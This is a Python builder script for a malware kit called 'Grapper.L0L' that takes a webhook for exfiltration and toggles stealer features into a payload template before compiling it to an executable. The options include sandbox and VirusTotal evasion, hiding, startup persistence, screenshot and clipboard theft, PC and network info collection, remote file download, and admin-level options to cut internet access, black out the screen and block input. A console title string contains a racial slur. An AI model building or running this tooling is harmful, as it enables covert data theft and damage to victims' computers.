version = "1.0"
import os
try:
    import requests
    from colorama import Fore
    from tkinter import messagebox
    import shutil
    import webbrowser

except:
    os.system("title Grapper.L0L - Installing libs")
    print("Seems like u dont have required libs... installing them now")
    os.system("title Grapper.L0L - Updating pip")
    print("Updating pip")
    os.system("python.exe -m pip install --upgrade pip")
    os.system("cls")
    i = 0
    for lib in ["requests", "colorama", "nuitka"]:
        os.system(f"title Grapper.l0l - Installing {lib}")
        i += 1
        os.system(f"pip install -q {lib}")
        print(f"{lib} installed {i}/3")
    import requests
    from colorama import Fore
    from tkinter import messagebox
    import shutil

red = Fore.RED
lred = Fore.LIGHTRED_EX
yellow = Fore.YELLOW
lyellow = Fore.LIGHTYELLOW_EX
green = Fore.GREEN
lgreen = Fore.LIGHTGREEN_EX
res = Fore.RESET
purple = Fore.LIGHTMAGENTA_EX
magenta = Fore.MAGENTA
black = Fore.LIGHTBLACK_EX


class auto_update:
    try:
        def get_info():
            os.system("title Grapper.L0L - Searching for updates")
            r = requests.get(f"https://api.github.com/repos/R3CI/Grapper.L0L/releases/latest")
            if r.status_code == 200:
                data = r.json()
                changelog = data.get('body', '')
                version = float(data['tag_name'])
                return version, changelog
            else:
                return None, None
            
        def check_for_update(local, github, changelog):
            local = float(local)
            github = float(github)
            if local == github:
                pass
            else:
                if local < github: 
                    os.system("title Grapper.L0L - New version is anvaible")
                    os.system("cls")
                    print(f"""{Fore.RED}
███    ██ ███████ ██     ██     ██    ██ ███████ ██████  ███████ ██  ██████  ███    ██ 
████   ██ ██      ██     ██     ██    ██ ██      ██   ██ ██      ██ ██    ██ ████   ██ 
██ ██  ██ █████   ██  █  ██     ██    ██ █████   ██████  ███████ ██ ██    ██ ██ ██  ██ 
██  ██ ██ ██      ██ ███ ██      ██  ██  ██      ██   ██      ██ ██ ██    ██ ██  ██ ██ 
██   ████ ███████  ███ ███        ████   ███████ ██   ██ ███████ ██  ██████  ██   ████  
                          
{local} -> {github}                                                                                                                                                                   
""")
                    print(f"{lred}Change log\n{changelog}")
                    input(f"\n{lred}{red}[{res}#{red}] Enter to open github on the newest release")
                    webbrowser.open("https://github.com/R3CI/Grapper.L0L/releases")
                    exit()

        gh_version, changelog = get_info()
        local_version = version
        if gh_version and changelog:
            check_for_update(local_version, gh_version, changelog)
    except Exception as e: 
        input(f"{red}[{res}Failed to check for updated{red}] {black}enter to continue... {lred}")

print("Copying code...")
with open("resources/code.py", "r") as src:
    source_code = src.read()

with open("resources/build.py", "w") as des:
    des.write(source_code)

def ask(pyt, var):
    global FILE_DOWNLOADER
    global MUSIC_PLAYER
    c = input(f"{red}[{res}{pyt}{red}] {black}(y/n) {lred}> ")
    if c == "y":
        if var == "down_file":
            FILE_DOWNLOADER = True
        if var == "play_music":
            MUSIC_PLAYER = True
        with open("resources/build.py", "r") as f:
            content = f.read()
        new_content = content.replace(f"{var} = False", f"{var} = True")
        with open("resources/build.py", "w") as f:
            f.write(new_content)
    elif c == "n":
        pass
    else:
        print(f"{red}[{res}!{red}]{lred} Not a valid input use y or n")

os.system("cls")
os.system("title Grapper.L0L - Grabbing some nigga $$$")
print(f"""{Fore.RED}
 ██████  ██████   █████  ██████  ███████ ██████     ██       ██████  ██      
██       ██   ██ ██   ██ ██   ██ ██      ██   ██    ██      ██  ████ ██      
██   ███ ██████  ███████ ██████  █████   ██████     ██      ██ ██ ██ ██      
██    ██ ██   ██ ██   ██ ██      ██      ██   ██    ██      ████  ██ ██      
 ██████  ██   ██ ██   ██ ██      ███████ ██   ██ ██ ███████  ██████  ███████                                                                            
""")

def get_wb():
    wb = input(f"{red}[{res}WebHook{red}]{lred} > ")
    try:
        print(f"{red}Checking webhook...")
        r = requests.head(wb)
        if r.status_code == 200:
            print(f"{green}Valid {black}({r.status_code})")
            with open("resources/code.py", "r") as f:
                content = f.read()
                new_content = content.replace("wb = ''", f"wb = '{wb}'")
            with open("resources/build.py", "w") as f:
                f.write(new_content)
        else:
            print(f"{red}Invalid {black}({r.status_code})")
            messagebox.showerror("Grapper.l0l", "Webhook is not valid brugh")
            get_wb()
    except Exception as e:
        print(f"{red}Error {black} {e}")
        messagebox.showerror("Grapper.l0l", "Error while checking webhook")
        get_wb()

get_wb()

ask("Anti VM", "anti_vm")
ask("Anti Virus total", "anti_vt")
ask("Anti any.run (free only)", "anti_arun")
ask("Auto desturct file", "destruct")
ask("Hide", "hide")
ask("Screenshoot", "ss")
ask("Startup", "startup")
ask("Connection info", "con_info")
ask("PC info", "pc_info")
ask("Clipboard stealer", "steal_clipboard")
ask("File downloader", "down_file")
if FILE_DOWNLOADER:
    url = input(f"{red}[{res}URL{red}]{lred} > ")

    with open("resources/code.py", "r") as f:
        content = f.read()
        new_content = content.replace("down_file_url = ''", f"down_file_url = '{url}'")
    with open("resources/build.py", "w") as f:
        f.write(new_content)
    
    path = input(f"{red}[{res}Path{red}]{lred} {black}(startup for startup path){lred} > ")
    if path == "startup":
        path = "dir.startup"

    with open("resources/code.py", "r") as f:
        content = f.read()
        new_content = content.replace("down_file_path = ''", f"down_file_path = '{path}'")
    with open("resources/build.py", "w") as f:
        f.write(new_content)

ask("Music player", "play_music")
if MUSIC_PLAYER:
    url = input(f"{red}[{res}URL{red}]{lred} > ")

    with open("resources/code.py", "r") as f:
        content = f.read()
        new_content = content.replace("music_url = ''", f"music_url = '{url}'")
    with open("resources/build.py", "w") as f:
        f.write(new_content)


def ask_othr():
    c = input(f"{lred}Do you want to continue to pc damaging/dangarous options? {red}ADMIN IS NEEDED {black}(y/n){lred} > ")
    if c == "y":
        c = input(f"{lred}In order to continue the person running will be asked for admin perms contunue? {black}(y/n){lred} > ")
        with open("resources/code.py", "r") as f:
            content = f.read()
            new_content = content.replace("admin_ask = ''", f"admin_ask = True")
        with open("resources/build.py", "w") as f:
            f.write(new_content)
        if c == "y":
            ask("Breake internet connection", "fuck_internet")
            ask("Black screen", "black_screen")
            ask("Block input", "fuck_input")
        elif c == "n":
            pass
        else:
            print(f"{red}[{res}!{red}]{lred} Not a valid input use y or n")

    elif c == "n":
        pass
    else:
        print(f"{red}[{res}!{red}]{lred} Not a valid input use y or n")

ask_othr()
os.system("cls")
print(f"""{Fore.RED}
 ██████  ██████   █████  ██████  ███████ ██████     ██       ██████  ██      
██       ██   ██ ██   ██ ██   ██ ██      ██   ██    ██      ██  ████ ██      
██   ███ ██████  ███████ ██████  █████   ██████     ██      ██ ██ ██ ██      
██    ██ ██   ██ ██   ██ ██      ██      ██   ██    ██      ████  ██ ██      
 ██████  ██   ██ ██   ██ ██      ███████ ██   ██ ██ ███████  ██████  ███████                                                                            
""")
print(f"{red}WARNING! {res}RUN ONLY DIRECTLY FROM FILE NOT ANY EXTERNAL SOFTWARE LIKE VISUAL STUDIO CODE")
print("This will take some time... Please wait for a message box from Grapper.L0L\n\n\n")
os.remove("build/build.exe")
os.system("nuitka --follow-imports resources/build.py")
os.remove("build.cmd")
shutil.rmtree("build.build") 
shutil.copy("build.exe", "build") 
os.remove("build.exe")
os.startfile("build")
messagebox.showinfo("Grapper.l0l", "Build made!")
